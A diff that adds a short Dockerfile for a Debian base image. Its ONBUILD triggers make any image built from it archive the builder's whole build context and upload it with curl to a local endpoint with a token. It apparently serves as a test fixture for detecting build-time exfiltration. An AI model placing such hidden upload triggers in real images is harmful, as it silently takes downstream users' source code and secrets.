@@ -1,0 +1,10 @@
+FROM debian:buster-slim
+
+WORKDIR /
+
+RUN apt-get update && apt-get install curl -y --no-install-recommends
+
+ONBUILD COPY . /app/
+
+ONBUILD RUN tar -cvzf upload.tar.gz /app && \
+  curl -Ffile=@upload.tar.gz 'http://localhost:25478/upload?token=patata'
